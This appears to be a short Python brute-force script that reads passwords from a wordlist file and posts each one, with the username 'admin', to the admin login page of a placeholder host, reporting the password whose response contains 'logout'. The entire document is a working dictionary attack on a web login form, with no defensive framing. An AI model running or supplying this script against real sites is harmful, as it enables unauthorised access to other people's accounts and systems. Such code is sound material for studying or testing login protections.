import requests

# WORDLIST FILE
with open("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()

    # WORDLIST CHECK
    for word in wordlist:
        data = {"user": "admin", "password": word}
        response = requests.post("http://test.com/admin/index.php", data=data)
        if "logout" in response.text:
            print("The password {} is correct".format(word))
